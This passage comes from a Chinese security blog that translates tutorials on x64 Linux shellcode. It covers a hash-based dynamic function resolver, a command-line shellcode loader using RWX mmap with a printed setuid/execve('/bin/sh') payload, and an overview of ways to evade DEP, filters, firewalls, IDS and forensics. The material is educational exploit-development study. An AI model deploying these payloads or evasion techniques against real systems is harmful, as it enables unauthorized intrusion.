</code></pre><p>接着，DF位(directional flag)被清空。这很重要，因为接下来的哈希过程使用了<code>lodsd</code>，而有漏洞应用的DF位不确定。</p>
<pre><code><span class="keyword">cld</span>
</code></pre><p>接着，<code>al</code>中的字节和<code>edx</code>相加，结果存入<code>edx</code>。左移12位(0xc)，当<code>lodsd</code>载入的字节是null时，哈希值就计算完毕了。</p>
<pre><code><span class="label">calc_hash_loop:</span>
    <span class="keyword">lodsb</span>
    <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>
    <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>
    <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>
    <span class="keyword">jnz</span> calc_hash_loop
</code></pre><p>接着使用push和pop把哈希置入<code>rsi</code>：</p>
<pre><code><span class="label">calc_done:</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
</code></pre><p>最后，恢复保存到寄存器</p>
<pre><code><span class="label">restore_regs:</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
</code></pre><h2 id="遍历到GOT的动态节(dynamic_section)">遍历到GOT的动态节(dynamic section)</h2><p>当前执行进程的动态节程序头总是在VMA(Virtual Memory Adress，虚拟内存地址)<code>0x00400130</code>。以下是个没有<code>\x00</code>(null-free)的版本：</p>
<pre><code><span class="label">_start:</span>
    <span class="keyword">push</span> <span class="number">0x400130ff</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">shr</span> <span class="literal">ebx</span>, <span class="number">0x8</span>
</code></pre><p>指向动态节的指针被抽取，长度被添加到动态节的长度上。GOT(Global Offset Table，全局偏移表)刚好就在动态节后面。通过以这种方式计算偏移量，可以不必从文件头中读取GOT的位置来遍历GOT。这有无数的好处。(译者：不知道有啥好处。。。)</p>
<pre><code><span class="label">fast_got:</span>
    <span class="keyword">mov</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>]
    <span class="keyword">add</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>+<span class="number">0x10</span>]
</code></pre><h3 id="抽取一个库指针">抽取一个库指针</h3><p>这个代码从GOT抽取个指向libc中任意函数的指针。比如在<code>rcx+0x18</code>地方，有指向<code>_dl_runtime_resolve</code>的指针。</p>
<pre><code><span class="label">extract_pointer:</span>
    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rcx</span>+<span class="number">0x20</span>]
</code></pre><p>现在寻找想要导入的二进制文件的基指针，首先寻找<code>\x7fELF</code>。因为RAM倒着保存信息，使用逆向比较来决定何时逆向循环。</p>
<pre><code><span class="label">find_base:</span>
    <span class="keyword">dec</span> <span class="literal">rbx</span>
    <span class="keyword">cmp</span> [<span class="literal">rbx</span>], <span class="number">0x464c457f</span>
    <span class="keyword">jne</span> find_base
</code></pre><h3 id="用户定义代码">用户定义代码</h3><p>现在基指针被计算出来，该载入开发者或用户的代码了。为了让调用函数(<code>invoke_function</code>)从寄存器中可重用，通过getPC来把调用函数的地址存入<code>rcx</code>。</p>
<pre><code><span class="keyword">jmp</span> startup

<span class="label">__initialize_world:</span>
    <span class="keyword">pop</span> rcx
    <span class="keyword">jmp</span> _world

<span class="label">startup:</span>
    <span class="keyword">call</span> __initialize_word

<span class="label">invoke_function:</span>
    ...
<span class="label">_world:</span>
    <span class="comment">; user-defined code goes here</span>
</code></pre><h3 id="接口">接口</h3><p>这里开发的运行时链接器能让用户自定的代码从<code>_world</code>开始。这个接口让开发者能提供函数哈希到<code>rbp</code>并且执行<code>call [rcx]</code>代替系统调用。这个例子描述了从内核调用exit(0)到使用链接器的API来调用exit(0)的过程。</p>
<p>以未链接的exit形式开始：</p>
<pre><code>exit：
    <span class="keyword">push</span> <span class="number">0x3c</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">syscall</span>
</code></pre><p>哈希<code>exit</code>(上面的相加右移)得到<code>0x696c4780</code></p>
<pre><code> ✘  ~/Work/project/blackhat/shellcode  cat hash-generator.s 
<span class="built_in">BITS</span> <span class="number">64</span>

<span class="built_in">global</span> _start
<span class="label">_start:</span>
    <span class="keyword">jmp</span> startup
<span class="label">
calc_hash:</span>
<span class="comment">; accept rsi hold function name.</span>
<span class="comment">; rdx=0 first</span>
<span class="comment">; return hash in rsi</span>
<span class="comment">; use rax, rdx, rsi</span>
    <span class="comment">; preserve rax&amp;rdx</span>
    <span class="keyword">push</span> <span class="literal">rax</span>    <span class="comment">; use as accum</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; zero register</span>
<span class="label">
    initialize_regs:</span>
        <span class="keyword">push</span> <span class="literal">rdx</span>
        <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">;rax = 0</span>
        <span class="keyword">cld</span><span class="comment">; clear zf for lodsb</span>
<span class="label">
        calc_hash_loop:</span>
            <span class="keyword">lodsb</span>   <span class="comment">; load one byte from rsi to al</span>
            <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>    <span class="comment">;right shift 12bits</span>
            <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>    <span class="comment">;add eax to edx</span>
            <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>     <span class="comment">; if al='\0'</span>
            <span class="keyword">jnz</span> calc_hash_loop
<span class="label">
    calc_done:</span>
        <span class="keyword">push</span> <span class="literal">rdx</span>
        <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; move hash in rdx to rsi</span>

    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; restore rdx&amp;rax</span>
<span class="keyword">ret</span>
<span class="label">
startup:</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; pointer to calc_hash</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; argc</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; pointer to argv[]</span>

    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>    <span class="comment">;rdx=0</span>
    <span class="keyword">call</span> calc_hash

    <span class="keyword">push</span> <span class="literal">rsi</span>    <span class="comment">; save hash on stack</span>
    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rsp</span>    <span class="comment">; rsi hold pointer to hash now</span>

    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; null</span>
    <span class="keyword">mov</span> <span class="literal">rcx</span>, <span class="literal">rsp</span>    <span class="comment">; rcx hold pointer to null now</span>

    <span class="keyword">mov</span> <span class="literal">rdi</span>, <span class="number">0x4</span>
<span class="label">    loop:</span>
        <span class="comment">; 倒着复制的</span>
        <span class="keyword">dec</span> <span class="literal">rdi</span>
        <span class="keyword">mov</span> <span class="literal">al</span>, [<span class="literal">rsi</span>+<span class="literal">rdi</span>*<span class="number">1</span>]
        <span class="keyword">mov</span> [<span class="literal">rcx</span>+<span class="literal">rdx</span>*<span class="number">1</span>], <span class="literal">al</span>
        <span class="keyword">inc</span> <span class="literal">rdx</span>
        <span class="keyword">cmp</span> <span class="literal">rdi</span>, <span class="number">0</span>  <span class="comment">; gas 竟然不能cmp %rdi, $0....但可以倒过来</span>
        <span class="keyword">jnz</span> <span class="keyword">loop</span>

    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rcx</span>    <span class="comment">;rsi hold pointer to reverse hash</span>
    <span class="keyword">inc</span> <span class="literal">rdi</span> <span class="comment">; rdi = 1</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="literal">rdi</span>    <span class="comment">; rax = 1</span>
    <span class="keyword">syscall</span>         <span class="comment">; write(1, reverse hash)</span>

    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="number">0x3c</span>   <span class="comment">; rax=60</span>
    <span class="keyword">dec</span> <span class="literal">rdi</span>         <span class="comment">; rdi=0</span>
    <span class="keyword">syscall</span>         <span class="comment">; exit(0)</span>
 ~/Work/project/blackhat/shellcode  nasm -felf64 hash-generator.s -o hash-generator.o
 ~/Work/project/blackhat/shellcode  ld hash-generator.o -o hash-generator
 ~/Work/project/blackhat/shellcode  ./hash-generator exit|hexdump -C
<span class="number">00000000</span>  <span class="number">69</span> 6c <span class="number">47</span> <span class="number">80</span>                                       |ilG.|
<span class="number">00000004</span>
</code></pre><p>所以，<code>_world</code>这么写</p>
<pre><code><span class="label">_world:</span>
    <span class="keyword">push</span> <span class="number">0x696c4780</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span> <span class="comment">; 正好倒过来，看看hash-generator.s的代码</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">call</span> [<span class="literal">rcx</span>]
</code></pre><p>开发者应该记着当调用那些可能改变寄存器的调用函数时保存<code>rcx</code>。或者通过更改<code>__initialize_world</code>中pop到的寄存器来移除限制。</p>
<h3 id="调用的函数">调用的函数</h3><p>这个注释是为了防止开发者忘记接口功能：</p>
<pre><code><span class="comment">;</span>
<span class="comment">;  Takes a function hash in %rbp and base pointer in %rbx</span>
<span class="comment">;  &gt;Parses the dynamic program headers of the ELF64 image</span>
<span class="comment">;  &gt;Uses ROP to invoke the function on the way back to the</span>
<span class="comment">;  -normal return location</span>
<span class="comment">;</span>
<span class="comment">;  Returns results of function to invoke.</span>
<span class="comment">;</span>
</code></pre><p>所有和libc交互的寄存器和任何可能被链接器使用的寄存器必须被保留，这样它们才能在函数调用时被恢复，<code>rbp</code>寄存器被保留两次。这时因为第一次保留在返回前被指向目的函数的指针覆盖。这让shellcode从目的函数返回到开发者定义的函数。</p>
<pre><code><span class="label">invoke_function:</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="literal">rax</span>
    <span class="keyword">push</span> <span class="literal">rbx</span>
    <span class="keyword">push</span> <span class="literal">rsi</span>
</code></pre><p>将<code>rdx</code>赋为0,吧函数哈希放入<code>rdi</code>来进行将来的比较</p>
<pre><code><span class="label">set_regs:</span>
    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
</code></pre><p>然后目的库导入的基址指针就放入<code>rbp</code></p>
<pre><code><span class="label">copy_base:</span>
    <span class="keyword">push</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span>
</code></pre><p>需要读取<code>[rbx+0x130]</code>四字节，但是添加到八字节的寄存器。</p>
<pre><code><span class="label">read_dynamic_section:</span>
    <span class="keyword">push</span> <span class="number">0x4c</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span> + <span class="literal">rax</span> * <span class="number">4</span>]
</code></pre><p>找到函数导出表，一般叫做<code>.dynsym</code>，或者动态符号表。通过遍历头检查动态节的类型。</p>
<pre><code><span class="label">check_dynamic_type:</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x10</span>
    cmpb [<span class="literal">rbx</span>], <span class="number">0x5</span>
    <span class="keyword">jne</span> check_dynamic_type
</code></pre><p>一旦ebx指向程序头中正确的位置;放置字符串表的绝对地址到<code>rax</code>和动态符号表的绝对地址到<code>rbx</code>。</p>
<pre><code><span class="label">string_table_found:</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="number">0x8</span>]  <span class="comment">; rax是动态字符串表的地址</span>
    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span>+<span class="number">0x18</span>] <span class="comment">; rbx是指向符号表的地址</span>
</code></pre><p>接着，增加到下一个导出，指向字符串的指针被放入<code>rsi</code>来哈希</p>
<pre><code><span class="label">check_next_hash:</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x18</span>   <span class="comment">;下一个条目</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">xor</span> <span class="literal">si</span>, [<span class="literal">rbx</span>]
    <span class="keyword">add</span> <span class="literal">rsi</span>, <span class="literal">rax</span>
</code></pre><p><code>calc_hash</code>标签被如上描述方式调用来哈希函数名。</p>
<pre><code><span class="label">calc_hash:</span>
    ...
</code></pre><p>比较当前导出表的函数哈希和想要导出的函数哈希，如果不匹配则跳到下一次导入：</p>
<pre><code><span class="label">check_current_hash:</span>
    <span class="keyword">cmp</span> <span class="literal">edi</span>, <span class="literal">esi</span>
    <span class="keyword">jne</span> check_next_hash
</code></pre><p>一旦哈希被找到，它的函数偏移位于<code>[rbx+0x8]</code>四字节。<code>rdx</code>被用来作为零寄存器来得到没有<code>\x00</code>的四字节。FIXME(not so) 添加到<code>rbp</code>基址指针：</p>
<pre><code><span class="label">found_hash:</span>
    <span class="keyword">add</span> <span class="literal">rbp</span>, [<span class="literal">rbx</span>+<span class="number">4</span>*<span class="literal">rdx</span>+<span class="number">0x8</span>]
</code></pre><p>这里，第一个例子中被保留的<code>rbp</code>被目的函数的地址覆盖。</p>
<pre><code><span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x30</span>], <span class="literal">rbp</span>
</code></pre><p>最后恢复所有寄存器。</p>
<pre><code>    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span>
<span class="keyword">ret</span>
</code></pre><p>跳到目的函数代码。</p>
<h3 id="动态shell">动态shell</h3><p>一旦添加链接器，一个115字节的socket重用载荷就变成了268字节的动态载入版本。这里有几种优化的方式，作为读者的练习。。。我得回头看看。。。</p>
<p>算了，我先看看<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a></p>
<p>令上午承蒙翔哥内推，刚填了简历，下午竟然就给我打电话电面了。。。然后就是强行谈及二进制安全被血虐最后被鄙视的过程，哈哈哈。</p>
<p>慢慢看，不把安全作为工作也许是种幸福呢。</p>
<p>毕业前：</p>
<ul>
<li>游戏</li>
<li>画</li>
</ul>
<p>兴趣：</p>
<ul>
<li>统计学习</li>
<li>二进制安全</li>
</ul>
<p>工作：</p>
<ul>
<li>？</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/16/shellcodeloaders/" itemprop="url">
                  Shellcode/Loaders
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
              2015-03-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/16/shellcodeloaders/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcodeloaders/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Shellcode_Loaders" target="_blank" rel="external">Shellcode/Loaders</a></p>
<p>shellcode Loader被用在缓冲区溢出或者其它形式的二进制挖掘活动中测试shellcode。最好的方法嘛，构建从命令行参数的用户友好的loader，并且传递给刚分配的可执行内存空间。本文在x86指令集写x64汇编来在linux上构建这么个载入器。</p>
<p>32位的在文末给出</p>
<p>[TOC]</p>
<h2 id="可执行loader">可执行loader</h2><h3 id="命令行参数">命令行参数</h3><p>命令行参数入栈的顺序是：第二个参数，第一个参数，参数数目。因此，为了从参数获得shellcode，<code>pop rbx</code>三次。一旦完成，<code>rbx</code>将包含指向shellcode的指针：</p>
<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
<span class="built_in">global</span> _start
<span class="label">_start:</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">;argc</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 参数列表指针</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 指向第一个参数的指针</span>
</code></pre><h3 id="通过mmap()分配可执行内存区域">通过mmap()分配可执行内存区域</h3><p>参考x64 syscall table，自己谷歌就好。</p>
<p>现代操作系统的栈默认并不可执行，但我们成功执行代码需要一个可执行栈。这可以通过mmap系统调用实现。</p>
<p><code>mmap()</code>的原型是(<code>man mmap</code>)：</p>
<pre><code><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, size_t length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,
                 <span class="keyword">int</span> fd, off_t offset)</span></span>;
</code></pre><p>在64位处理器上，函数调用如下：</p>
<pre><code>function_call(<span class="variable">%rax</span>) = function(<span class="variable">%rdi</span>,  <span class="variable">%rsi</span>,  <span class="variable">%rdx</span>,  <span class="variable">%r10</span>,  <span class="variable">%r8</span>,  <span class="variable">%r9</span>)
              ^<span class="keyword">system</span>          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
               call <span class="comment">#</span>
</code></pre><p>首先，<code>mmap()</code>的系统调用数(syscall number)放入<code>rax</code>：</p>
<pre><code><span class="keyword">push</span> <span class="number">0x9</span>
<span class="keyword">pop</span> <span class="literal">rax</span>
</code></pre><p><code>mmap()</code>的第一个参数需要是<code>null</code>，所以<code>xor rdi rdi</code>。</p>
<pre><code><span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
</code></pre><p>指定缓冲区大小(4096字节或者0x1000字节) ，这个参数传给<code>rsi</code></p>
<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; rsi = 0</span>
<span class="keyword">inc</span> <span class="literal">rsi</span> <span class="comment">; rsi = 1</span>
<span class="keyword">shl</span> <span class="literal">rsi</span>, <span class="number">0xc</span>  <span class="comment">; rsi=0x1000</span>
</code></pre><p>第三个参数<code>prot</code>保存在<code>rdx</code>中，是内核权限标志(读、写、执行或无)，对多个标志，它们用按位或方式合在一起，<code>PROT_READ|PROT_WRITE|PROT_EXEC</code>是数字<code>7</code>,所以直接在<code>rdx</code>中放入7就行。</p>
<pre><code><span class="keyword">push</span> <span class="number">0x7</span>
<span class="keyword">pop</span> <span class="literal">rdx</span>
</code></pre><p>接下来的参数<code>flag</code>跟<code>prot</code>类似，保存了内存映射标志。本例中设置为<code>MAP_PRIVATE|MAP_ANONYMOUS</code>，其值为数字<code>0x22</code>。存储在<code>r10</code>中。</p>
<pre><code><span class="keyword">push </span><span class="number">0x22</span>
<span class="keyword">pop </span><span class="literal">r10</span>
</code></pre><p>最后两个参数应该为<code>null</code>，放到<code>r8</code>和<code>r9</code>中</p>
<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">pop</span> <span class="literal">r8</span>
<span class="keyword">pop</span> <span class="literal">r9</span>
</code></pre><p>万事具备，进行系统调用。</p>
<pre><code><span class="keyword">syscall</span>
</code></pre><p>接下来<code>rax</code>中就包含指向缓冲区的指针，这个指针可以用来把shellcode拷贝进去。</p>
<h3 id="拷贝代码到新内存区域">拷贝代码到新内存区域</h3><p>把<code>rsi</code>作为计数器，初始化为0：</p>
<pre><code>inject：
    <span class="keyword">xor</span> <span class="literal">rsi</span>, <span class="literal">rsi</span>
</code></pre><p>把<code>rdi</code>设为<code>null</code>，等下要把当前字节和<code>dil</code>(rdi低8位)中的值比较来确定shellcode的结束位置。</p>
<pre><code><span class="keyword">push</span> <span class="literal">rsi</span>
<span class="keyword">pop</span> <span class="literal">rdi</span>
</code></pre><p>如果拷贝到达shellcode末尾，则跳到<code>inject_finished</code>：</p>
<pre><code><span class="label">inject_loop:</span>
    <span class="keyword">cmp</span> [<span class="literal">rbx</span> + <span class="literal">rsi</span> * <span class="number">1</span>], <span class="literal">dil</span>
    <span class="keyword">je</span> inject_finished
</code></pre><p>每个字节从<code>[rbx + rsi]</code>移动到<code>[rax + rsi]</code>，通过<code>r10b</code>(<code>r10</code>低八位)。</p>
<pre><code><span class="keyword">mov</span> <span class="literal">r10b</span>, [<span class="literal">rbx</span>+<span class="literal">rsi</span>*<span class="number">1</span>]
<span class="keyword">mov</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="literal">r10b</span>
</code></pre><p><code>rsi</code>作为偏移量和计数器：</p>
<pre><code><span class="keyword">inc</span> <span class="literal">rsi</span>
</code></pre><p>继续循环</p>
<pre><code><span class="keyword">jmp</span> inject_loop:
</code></pre><p>在<code>inject_finished</code>程序出附上<code>ret</code>操作符(opcode)<code>0xc3</code></p>
<pre><code><span class="label">inject_finished:</span>
    <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="number">0xc3</span>
</code></pre><p>一般，操作符(opcode)指指令而字节码(bytecode)不仅包含操作符还包含参数，成为操作数(operand)。</p>
<h3 id="返回代码">返回代码</h3><p>代码返回而不是跳转或被调用的原因在于，这更充分模拟了类似有漏洞应用在缓冲区溢出时的环境。有效载荷会返回，因此，当shellcode被加载后，它应该返回。</p>
<p>首先调用<code>ret_to_shellcode</code>。这会把<code>exit</code>的地址推入栈顶，于是shellcode结束后返回<code>exit</code>的地址。</p>
<pre><code><span class="built_in">call</span> ret_to_shellcode
</code></pre><p>原始的返回地址被覆盖为为shellcode的地址，并且进入(returned into)</p>
<pre><code><span class="label">ret_to_shellcode:</span>
    <span class="keyword">push</span> rax
    <span class="keyword">ret</span>
</code></pre><p>当shellcode结束时，将返回到<code>exit</code>函数优雅的退出</p>
<pre><code>exit：
    <span class="keyword">push</span> <span class="number">60</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">syscall</span>
</code></pre><h3 id="执行loader">执行loader</h3><p>编译链接吧</p>
<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  nasm -felf64 loader64.s -o loader64.o
 <span class="special">~</span>/Work/project/blackhat/shellcode  ld loader64.o -o loader64
 <span class="special">~</span>/Work/project/blackhat/shellcode  ./loader64 <span class="formula">$(echo -en "<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>48<span class="command">\xbf</span><span class="command">\x</span>6a<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xc</span>1<span class="command">\xef</span><span class="command">\x</span>08<span class="command">\x</span>57<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05")
<span class="special">[</span>reverland@gentoo shellcode<span class="special">]</span>$</span>
</code></pre><p>这个shellcode来自之前启动一个shell的shellcode，注意提示符。</p>
<h2 id="基于返回的载入器">基于返回的载入器</h2><p>基于返回的代码也能用载入器测试，而且更小，不需要分配内存。</p>
<pre><code><span class="label">_start:</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rsp</span> <span class="comment">; rsp现在指向第一个参数</span>
    <span class="keyword">ret</span>
</code></pre><p>只是我觉得，似乎参数位置是不可执行的。关于ROP，以后说吧</p>
<p>最后还有些动态载入和动态socket载入器。当shellcode依赖有漏洞二进制程序上下文时包含一个链接的动态部分，这是啥我现在还不知道。。。。。。</p>
<p>下一篇<a href="http://blackhat.life/Shellcode/Dynamic" target="_blank" rel="external">Dynamic shellcode</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/16/shellcode/" itemprop="url">
                  Shellcode
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
              2015-03-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/16/shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Shellcode" target="_blank" rel="external">category:Shellcode</a></p>
<p>Shellcode，也叫bytecode，是用在缓冲区溢出漏洞挖掘中的机器码(用十六进制表示的二进制文件)，或者为了方便人类阅读写成汇编。程序员能使用机器码，用汇编方法写任何应用程序(就像所有其它高级编程语言一样)。并且不像很多语言只限定在某个操作系统或指令架构上。</p>
<p>shellcode需要位计算、linux汇编和栈溢出的基础知识。</p>
<p>[TOC]</p>
<p>每种语言最后都解释为二进制，不管是编译的(compile-time)还是解释(runtime)。编写缓冲区溢出时要记住，有很多潜在的来自安全机制的障碍(比如DEP、ASLR、防火墙、或者IDS或者IPS应用)。一次面对现代对策的成功漏洞利用，需要利用许多过滤绕过和IDS侵入技术。</p>
<h2 id="类型">类型</h2><p>根据执行代码的目标环境有许多类型的shellcode，在OSI模型不同层次有不同种类的对策，需要有不同的技术来成功挖掘指定的应用漏洞。</p>
<h3 id="可执行程序(executable)_vs_基于返回的(return-oriented)">可执行程序(executable) vs 基于返回的(return-oriented)</h3><p>大致从运行时观点看有两种shellcode：可执行shellcode和基于返回的shellcode。这要看目标环境是否能执行数据栈来决定选择哪种。如果目标合适，基于返回的shellcode无视栈是否能执行，而可执行的shellcode只能在可执行栈上运行。</p>
<ul>
<li><p>可执行shellcode在它相应的目标操作系统中用汇编写成，大多数可执行shellcode，或者传统的null-free shellcode，可以用在任何有漏洞且有可执行栈的应用上。</p>
</li>
<li><p>基于返回的shellcode当堆栈不可执行时利用ROP(return oriented programming).通常通过构造调用栈模仿正常的编译程序来调用可执行shellcode。因为调用栈被视为数据，这在漏洞挖掘中绕过了需要栈可执行的限制。</p>
</li>
</ul>
<p>然而，特定指令集架构比如MIPS，不能使用基于返回的编程技术或者传统的堆栈溢出，因为它们不在栈上存储返回地址。</p>
<h3 id="对策和措施">对策和措施</h3><p>尽管传统二进制shellcode通常能顺利工作在没过滤机制、没打补丁、或者大输入的情况下，许多目标环境和应用也有许多限制因素来组织传统机器码执行。许多C或者C++写成的应用都需要机器码是null-free的(没有<code>\x00</code>)，这就是为何null-free shellcode是可执行shellcode编程的传统基础形式。</p>
<ul>
<li>字符过滤可以利用多态(自修改)来在允许字符集外运行时构造字节，来绕过限制。许多字符过滤限制到可打印字符集，所以ascii和alphanumeric shellcode变成该技术的主导技术。</li>
<li>字符编码能通过编码载荷使之解码为相应的十六进制机器码绕过。通常代码必须在被拷贝到有漏洞的缓冲区前经过unicode、base64、大小写转换或者其它解码仍然存在。</li>
<li>缓冲区尺寸也许惊人有限，某些环境中载荷太大不能放入缓冲区，这时就需要二次注入技术(second-order-injection)。结果是shellcode尺寸保持在最小来优化重用。</li>
<li>防火墙通过阻碍外出连接或者监听socket接收流量来限制远程shellcode。绕过防火墙技术可以通过文件描述符重用技术实现。</li>
<li>分析者可能调试有漏洞的应用尝试逆向工程挖掘过程。int3断点探测和单向哈希(one-way hashing)技术能组织取证分析工具比如volatility</li>
<li>签名通常特别阻止linux shellcode因为系统调用传统上被用来作为C调用风格的接口，因此大多给定shellcode的静态部分都有个C接口。甚至多态和自修改代码通常都生成包含系统调用的shellcodes。系统调用可以通过子链接代码实现。</li>
</ul>
